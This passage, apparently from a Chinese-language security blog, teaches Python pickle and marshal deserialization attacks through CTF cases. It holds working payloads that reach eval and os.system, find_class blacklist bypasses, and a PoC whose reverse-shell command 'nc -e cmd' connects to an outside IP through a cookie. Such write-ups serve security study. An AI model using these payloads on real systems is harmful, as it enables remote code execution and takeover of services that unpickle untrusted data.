<span class="hljs-number">19.</span> `(S<span class="hljs-string">'__import__("os").system("whoami")'</span>`: 这个操作码表示创建一个元组，包含了一个字符串，其中包含了 `<span class="hljs-built_in">eval</span>` 执行的代码。这段代码尝试执行系统命令 `whoami`。

<span class="hljs-number">20.</span> `tR.`: 这个操作码表示调用 `<span class="hljs-built_in">eval</span>` 函数，并将堆栈顶部的两个值作为参数传递给 `<span class="hljs-built_in">eval</span>`。

最终结果：根据 `<span class="hljs-built_in">eval</span>` 函数的调用，它会执行字符串 `<span class="hljs-string">'__import__("os").system("whoami")'</span>` 中的代码，即执行系统命令 `whoami`。由于这段代码是恶意的，它试图在系统上执行一个命令，这可能会引发安全问题。因此，处理来自不受信任源的 Pickle 数据时要非常小心，以防止潜在的安全风险。</code></pre>
<p>这里用pker工具使用的话，过程如下：</p>
<pre><code class="hljs py"><span class="hljs-comment">#payload.py</span>
 
<span class="hljs-comment">#获取getattr函数</span>
<span class="hljs-built_in">getattr</span> = GLOBAL(<span class="hljs-string">'builtins'</span>, <span class="hljs-string">'getattr'</span>)
<span class="hljs-comment">#获取字典的get方法</span>
get = <span class="hljs-built_in">getattr</span>(GLOBAL(<span class="hljs-string">'builtins'</span>, <span class="hljs-string">'dict'</span>), <span class="hljs-string">'get'</span>)
<span class="hljs-comment">#获取globals方法</span>
golbals=GLOBAL(<span class="hljs-string">'builtins'</span>, <span class="hljs-string">'globals'</span>)
<span class="hljs-comment">#获取字典</span>
builtins_dict=golbals()
<span class="hljs-comment">#获取builtins模块</span>
__builtins__ = get(builtins_dict, <span class="hljs-string">'__builtins__'</span>)
<span class="hljs-comment">#获取eval函数</span>
<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">getattr</span>(__builtins__,<span class="hljs-string">'eval'</span>)
<span class="hljs-built_in">eval</span>(<span class="hljs-string">"__import__('os').system('whoami')"</span>)
<span class="hljs-keyword">return</span></code></pre>
<pre><code class="hljs py">python3 pker.py &lt; pker_test.py
<span class="hljs-string">b"cbuiltins\ngetattr\np0\n0g0\n(cbuiltins\ndict\nS'get'\ntRp1\n0cbuiltins\nglobals\np2\n0g2\n(tRp3\n0g1\n(g3\nS'__builtins__'\ntRp4\n0g0\n(g4\nS'eval'\ntRp5\n0g5\n(S'__import__(\\'os\\').system(\\'whoami\\')'\ntR."</span></code></pre>
<h4 id="高校战疫网络安全分享赛webtmp">高校战疫网络安全分享赛:webtmp</h4>
<p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle：</p>
<pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">'__main__'</span>: <span class="hljs-comment"># 只允许__main__模块</span>
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">'__main__'</span>], name)
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> % (module, name))</code></pre>
<p>此外，禁止了<code>b'R'</code>：</p>
<pre><code class="hljs py"><span class="hljs-keyword">try</span>:
    pickle_data = request.form.get(<span class="hljs-string">'data'</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">in</span> base64.b64decode(pickle_data): 
        <span class="hljs-keyword">return</span> <span class="hljs-string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></code></pre>
<p>目标是覆盖secret中的验证，由于secret被主程序引入，是存在于<code>__main__</code>下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p>
<pre><code class="hljs py"><span class="hljs-string">b'''c__main__</span>
<span class="hljs-string">secret</span>
<span class="hljs-string">(S'name'</span>
<span class="hljs-string">S"1"</span>
<span class="hljs-string">S"category"</span>
<span class="hljs-string">S"2"</span>
<span class="hljs-string">db0(S"1"</span>
<span class="hljs-string">S"2"</span>
<span class="hljs-string">i__main__</span>
<span class="hljs-string">Animal</span>
<span class="hljs-string">.'''</span></code></pre>
<p>除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。</p>
<h4 id="ctf-case1">CTF-case1</h4>
<p>上述的反序列化题目还是有难度的，这里看小迪有一个简单的CTF案例，浅浅研究一下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request

app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/"</span></span>)</span><span class="hljs-comment"># /路由下的功能</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment">#对cookie中的user参数进行base64的解码</span>
        user = base64.b64decode(request.cookies.get(<span class="hljs-string">'user'</span>))
        <span class="hljs-comment">#对user参数反序列化</span>
        user = pickle.loads(user)
        <span class="hljs-comment">#将其中的username对应的值赋值</span>
        username = user[<span class="hljs-string">"username"</span>]
    <span class="hljs-keyword">except</span>:
        <span class="hljs-comment">#如果user数据中没有username键值，则将username赋值为指定字符串</span>
        username = <span class="hljs-string">"Guest"</span>

    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello %s"</span> % username

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(
        host=<span class="hljs-string">'192.168.1.3'</span>,
        port=<span class="hljs-number">5000</span>,
        debug=<span class="hljs-literal">True</span>
    )</code></pre>
<p>这里是开启环境的py文件。分析一波很明显就是我们要将user参数传入cookie并且还要进行base编码，那其中user可控，直接传入恶意序列化数据即可，我们运行之后bp抓包。接着我们编写一下poc</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> requests

<span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>():
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">'nc -e cmd 124.220.233.26 5555'</span>,))

p = exp()
result = pickle.dumps(p)
result = base64.b64encode(result)
<span class="hljs-built_in">print</span>(result)

<span class="hljs-comment">#输出b'gASVNQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjB1uYyAtZSBjbWQgMTI0LjIyMC4yMzMuMjYgNTU1NZSFlFKULg=='</span></code></pre>
<p>这里我们对reduce方法进行了重写，最后的数据如果被反序列化，那将会执行nc命令去尝试连接对应ip的port</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213193326126.png" alt="image-20231213193326126"></p>
<p>如上图我们成功拿到shell，那这里我们仍然可以继续编写，使其功能完善，直接在py上对靶机进行请求，不必使用bp，我们做如下修改</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> requests

<span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>():
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">'nc -e cmd 124.220.233.26 5555'</span>,))

p = exp()
result = pickle.dumps(p)
<span class="hljs-built_in">print</span>(result)
result = base64.b64encode(result).decode()
<span class="hljs-built_in">print</span>(result)

header = {
    <span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'user='</span>+result
}
requests.get(url=<span class="hljs-string">'http://192.168.246.1:5000/'</span>, headers=header)</code></pre>
<p>让其运行的时候自动访问靶机地址，如下图执行成功。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213194702267.png" alt="image-20231213194702267"></p>
<p>不过这里有一个嫌疑，就是该命令可以我再执行上述exp程序的时候（反序列化的时候会自动调用reduce方法）便被调用，因此我们可以本机开环境，另一台主机执行上述poc</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231214113711236.png" alt="image-20231214113711236"></p>
<p>如上图可以看到成功执行，不过这里似乎需要注意python版本问题，上述CTF环境是在Python3.8下搭建的，这里运行poc脚本似乎也需要在Python3.8下运行（因为我再python3.11下测试不成功）</p>
<h1 id="0x06-marshal-反序列化">0x06 Marshal 反序列化</h1>
<p>由于<code>pickle</code>无法序列化<code>code</code>对象, 因此在<code>python2.6</code>后增加了一个<code>marshal</code>模块来处理<code>code</code>对象的序列化问题.</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> marshal

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():
    <span class="hljs-keyword">import</span> os
    os.system(<span class="hljs-string">'/bin/sh'</span>)

code_serialized = base64.b64encode(marshal.dumps(demo()))
<span class="hljs-built_in">print</span>(code_serialized)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116210202469.png" alt="image-20231116210202469"></p>
<p>但是<code>marshal</code>不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
<p>这时候就要利用上面分析的那个<code>PVM</code>操作码来进行构造了, 先写出来需要执行的内容, <code>Python</code>能通过<code>types.FunctionTyle(func_code,globals(),'')()</code>来动态地创建匿名函数, 这一部分的内容可以看<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/types.html">官方文档</a>的介绍.</p>
<p>结合上文的示例代码, 最重要执行的是: <code>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()</code>.</p>
<p>这里直接贴一下别的师傅给出来的<code>Payload</code>模板.</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> marshal

<span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():
    <span class="hljs-keyword">import</span> os
    os.system(<span class="hljs-string">'whoami;/bin/sh'</span>)     <span class="hljs-comment"># evil code</span>

shell = <span class="hljs-string">"""ctypes</span>
<span class="hljs-string">FunctionType</span>
<span class="hljs-string">(cmarshal</span>
<span class="hljs-string">loads</span>
<span class="hljs-string">(cbase64</span>
<span class="hljs-string">b64decode</span>
<span class="hljs-string">(S'%s'</span>
<span class="hljs-string">tRtRc__builtin__</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">(tRS''</span>
<span class="hljs-string">tR(tR."""</span> % base64.b64encode(marshal.dumps(foo.func_code))

<span class="hljs-built_in">print</span>(pickle.loads(shell))</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116210216495.png" alt="image-20231116210216495"></p>
<h1 id="0x07-pass总结">0x07 Pass总结</h1>
<h2 id="71-绕过builtins">7.1 绕过builtins</h2>
<h3 id="思路一">思路一</h3>
<p>这里上述的CTF分析过该思路了，这里我就直接cv了</p>
<p>在一些例子中，我们常常会见到<code>module=="builtins"</code>这一限制，比如官方文档中的例子，只允许我们导入<code>builtins</code>这一模块</p>
<pre><code class="hljs py"><span class="hljs-keyword">if</span> module == <span class="hljs-string">"builtins"</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)</code></pre>
<p>那么什么是<code>builtins</code>模块呢？</p>
<p>当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如</p>
<pre><code class="hljs py">&gt;&gt;&gt;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)
<span class="hljs-number">1</span></code></pre>
<p>上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。</p>
<p>我们可以通过<code>for i in sys.modules['builtins'].__dict__:print(i)</code>来查看该模块中包含的所有模块函数等，大致如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116211655339.png" alt="image-20231116211655339"></p>
<p><strong>Code-Breaking:picklecode</strong></p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> builtins
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):
    blacklist = {<span class="hljs-string">'eval'</span>, <span class="hljs-string">'exec'</span>, <span class="hljs-string">'execfile'</span>, <span class="hljs-string">'compile'</span>, <span class="hljs-string">'open'</span>, <span class="hljs-string">'input'</span>, <span class="hljs-string">'__import__'</span>, <span class="hljs-string">'exit'</span>}
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):
        <span class="hljs-comment"># Only allow safe classes from builtins.</span>
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">"builtins"</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)
        <span class="hljs-comment"># Forbid everything else.</span>
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> %
                                     (module, name))
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):
    <span class="hljs-string">"""Helper function analogous to pickle.loads()."""</span>
    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</code></pre>
<p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。</p>
<p>我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用<code>getattr()</code>函数，<code>getattr</code>可以获取对象的属性值。因此我们可以通过<code>builtins.getattr(builtins,'eval')</code>的形式来获取eval函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116212103967.png" alt="image-20231116212103967"></p>
<p>接下来我们得构造出一个<code>builtins</code>模块来传给<code>getattr</code>的第一个参数，我们可以使用<code>builtins.globals()</code>函数获取builtins模块包含的内容</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> builtins
<span class="hljs-built_in">print</span>(builtins.<span class="hljs-built_in">globals</span>())</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116212125197.png" alt="image-20231116212125197"></p>
<p>可见builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116212132995.png" alt="image-20231116212132995"></p>
<p>最终构造的payload为<code>builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)</code></p>
<p>思路有了，下面就是手写opcode了。首先获取get函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
opcode=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tR.</span>
<span class="hljs-string">'''</span>
pickletools.dis(opcode)
<span class="hljs-built_in">print</span>(pickle.loads(opcode))
 
<span class="hljs-comment">###结果如下</span>
    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'builtins getattr'</span>
   <span class="hljs-number">18</span>: (    MARK
   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">'builtins dict'</span>
   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">'get'</span>
   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)
   <span class="hljs-number">42</span>: R    REDUCE
   <span class="hljs-number">43</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">0</span>
&lt;method <span class="hljs-string">'get'</span> of <span class="hljs-string">'dict'</span> objects&gt;</code></pre>
<p>然后获取globals()字典</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
opcode2=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)R.</span>
<span class="hljs-string">'''</span>
 
pickletools.dis(opcode2)
<span class="hljs-built_in">print</span>(pickle.loads(opcode2))
 
<span class="hljs-comment">###结果如下</span>
    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'builtins globals'</span>
   <span class="hljs-number">18</span>: )    EMPTY_TUPLE
   <span class="hljs-number">19</span>: R    REDUCE
   <span class="hljs-number">20</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">1</span>
{<span class="hljs-string">'__name__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__doc__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__package__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001EF06A308B0</span>&gt;, <span class="hljs-string">'__spec__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__annotations__'</span>: {}, <span class="hljs-string">'__builtins__'</span>: &lt;module <span class="hljs-string">'builtins'</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">'__file__'</span>: <span class="hljs-string">'C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py'</span>, <span class="hljs-string">'__cached__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'pickle'</span>: &lt;module <span class="hljs-string">'pickle'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickle.py'</span>&gt;, <span class="hljs-string">'pickletools'</span>: &lt;module <span class="hljs-string">'pickletools'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickletools.py'</span>&gt;, <span class="hljs-string">'opcode1'</span>: <span class="hljs-string">b"cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR.\n"</span>, <span class="hljs-string">'opcode2'</span>: <span class="hljs-string">b'cbuiltins\nglobals\n)R.\n'</span>}</code></pre>
<p>现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
opcode3=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tR(cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)RS'__builtins__'</span>
<span class="hljs-string">tR.'''</span>
 
<span class="hljs-comment">#以上opcode相当于执行了builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins')</span>
 
pickletools.dis(opcode3)
<span class="hljs-built_in">print</span>(pickle.loads(opcode3))
 
<span class="hljs-comment">###结果如下</span>
    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'builtins getattr'</span>
   <span class="hljs-number">18</span>: (    MARK
   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">'builtins dict'</span>
   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">'get'</span>
   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)
   <span class="hljs-number">42</span>: R    REDUCE
   <span class="hljs-number">43</span>: (    MARK
   <span class="hljs-number">44</span>: c        GLOBAL     <span class="hljs-string">'builtins globals'</span>
   <span class="hljs-number">62</span>: (        MARK
   <span class="hljs-number">63</span>: t            TUPLE      (MARK at <span class="hljs-number">62</span>)
   <span class="hljs-number">64</span>: R        REDUCE
   <span class="hljs-number">65</span>: S        STRING     <span class="hljs-string">'builtins'</span>
   <span class="hljs-number">77</span>: t        TUPLE      (MARK at <span class="hljs-number">43</span>)
   <span class="hljs-number">78</span>: R    REDUCE
   <span class="hljs-number">79</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">0</span>
&lt;module <span class="hljs-string">'builtins'</span> (built-<span class="hljs-keyword">in</span>)&gt;</code></pre>
<p>最后我们再调用获取到的builtins的eval函数即可</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
 
opcode4=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tR(cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)RS'__builtins__'</span>
<span class="hljs-string">tRS'eval'</span>
<span class="hljs-string">tR.'''</span>
 
<span class="hljs-built_in">print</span>(pickle.loads(opcode4))
 
<span class="hljs-comment">###</span>
&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">eval</span>&gt;</code></pre>
<p>最终payload为：</p>
<pre><code class="hljs py"><span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">p0</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tRp1</span>
<span class="hljs-string">cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)Rp2</span>
<span class="hljs-string">00g1</span>
<span class="hljs-string">(g2</span>
<span class="hljs-string">S'builtins'</span>
<span class="hljs-string">tRp3</span>
<span class="hljs-string">0g0</span>
<span class="hljs-string">(g3</span>
<span class="hljs-string">S'eval'</span>
<span class="hljs-string">tR(S'__import__("os").system("whoami")'</span>
<span class="hljs-string">tR.</span>
<span class="hljs-string">'''</span></code></pre>
<p>这里附上GPT的分析，但解释的不太好。。。</p>
<h3 id="思路二">思路二</h3>
<p>这里也是跟着佬学的，他是通过globals全局变量中的pickle直接进行的，说明如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116214117639.png" alt="image-20231116214117639"></p>
<p>输出之后我们看到里面确实含有pickle模块，那我们可以尝试导入使用pickle.loads()来绕过find_class()的限制</p>
<p>但这里存在一些小问题，这里直接放出佬的思考研究了：</p>
<p>不过值得注意的是，由于<code>pickle.loads()</code>的参数需要为<code>byte</code>类型。而在<code>Protocol 0</code>中，对于byte类型并没有很好的支持，需要额外导入encode()函数，可能会导致无法绕过<code>find_class</code>限制。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
b=<span class="hljs-string">b'abcdef'</span>
opcode=pickle.dumps(b,protocol=<span class="hljs-number">0</span>)
pickletools.dis(opcode)

<span class="hljs-comment">###</span>
   <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'_codecs encode'</span>
   <span class="hljs-number">16</span>: p    PUT        <span class="hljs-number">0</span>
   <span class="hljs-number">19</span>: (    MARK
   <span class="hljs-number">20</span>: V        UNICODE    <span class="hljs-string">'abcdef'</span>
   <span class="hljs-number">28</span>: p        PUT        <span class="hljs-number">1</span>
   <span class="hljs-number">31</span>: V        UNICODE    <span class="hljs-string">'latin1'</span>
   <span class="hljs-number">39</span>: p        PUT        <span class="hljs-number">2</span>
   <span class="hljs-number">42</span>: t        TUPLE      (MARK at <span class="hljs-number">19</span>)
   <span class="hljs-number">43</span>: p    PUT        <span class="hljs-number">3</span>
   <span class="hljs-number">46</span>: R    REDUCE
   <span class="hljs-number">47</span>: p    PUT        <span class="hljs-number">4</span>
   <span class="hljs-number">50</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">0</span></code></pre>
<p>直到<code>Protocol 3</code>版本，Python才引入了<code>B</code>和<code>C</code>两个字节码来标识byte类型</p>
<pre><code class="hljs py"><span class="hljs-comment"># Protocol 3 (Python 3.x)</span>
 
BINBYTES       = <span class="hljs-string">b'B'</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span>
SHORT_BINBYTES = <span class="hljs-string">b'C'</span>   <span class="hljs-comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></code></pre>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
b=<span class="hljs-string">b'abcdef'</span>
opcode=pickle.dumps(b,protocol=<span class="hljs-number">0</span>)
pickletools.dis(opcode)

<span class="hljs-comment">###</span>
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: C    SHORT_BINBYTES <span class="hljs-string">b'abcdef'</span>
   <span class="hljs-number">10</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">12</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">3</span></code></pre>
<p>可以看到此时pickle对于<code>byte</code>类型变量的支持精简了很多。所以当我们想利用<code>pickle.loads()</code>来绕过find_class时，最好选择<code>Protocol 3</code>版本的opcode构造。</p>
<p>下面我们就来一步步构造<code>Protocol 3</code>版本的Payload</p>
<p>首先获取get函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> builtins
<span class="hljs-keyword">import</span> pickletools

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">getattr</span>,(builtins.<span class="hljs-built_in">dict</span>, <span class="hljs-string">'get'</span>,))

poc = Demo()
opcode = pickle.dumps(poc, protocol=<span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(opcode)
pickletools.dis(opcode)

<span class="hljs-comment">#输出：</span>
<span class="hljs-string">b'\x80\x03cbuiltins\ngetattr\nq\x00cbuiltins\ndict\nq\x01X\x03\x00\x00\x00getq\x02\x86q\x03Rq\x04.'</span>
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'builtins getattr'</span>
   <span class="hljs-number">20</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">22</span>: c    GLOBAL     <span class="hljs-string">'builtins dict'</span>
   <span class="hljs-number">37</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">39</span>: X    BINUNICODE <span class="hljs-string">'get'</span>
   <span class="hljs-number">47</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">49</span>: \x86 TUPLE2
   <span class="hljs-number">50</span>: q    BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-number">52</span>: R    REDUCE
   <span class="hljs-number">53</span>: q    BINPUT     <span class="hljs-number">4</span>
   <span class="hljs-number">55</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">2</span></code></pre>
<p>其中有很多<code>q\0xn</code>字节码，实际测试去掉也是可以的</p>
